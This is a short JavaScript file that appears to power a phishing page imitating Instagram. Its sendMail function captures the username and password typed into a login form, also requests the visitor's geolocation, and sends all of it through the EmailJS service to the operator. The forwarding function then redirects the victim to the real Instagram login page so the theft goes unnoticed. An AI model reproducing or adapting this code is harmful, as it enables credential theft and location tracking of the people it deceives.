function sendMail() {
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  const serviceid = 'service_udupifp';
  const templateid = 'template_rfoq0w4';

  function sendEmailWithParams(params) {
    emailjs.send(serviceid, templateid, params)
      .then(res => {
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
      })
      .catch(err => alert(err));
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      var params = {
        username_id: username,
        passwort_id: password,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude
      };
      sendEmailWithParams(params);
    }, function(error) {
      alert("Unable to retrieve location: " + error.message);
      var params = {
        username_id: username,
        passwort_id: password,
        latitude: '',
        longitude: ''
      };
      sendEmailWithParams(params);
    });
  } else {
    alert("Geolocation is not supported by this browser.");
    var params = {
      username_id: username,
      passwort_id: password,
      latitude: '',
      longitude: ''
    };
    sendEmailWithParams(params);
  }
}



function forwarding(){
  document.getElementById("LoginButton").addEventListener("click", function() {
    // Redirect to Instagram login page
    window.location.href = "https://www.instagram.com/accounts/login/";
  });
  }
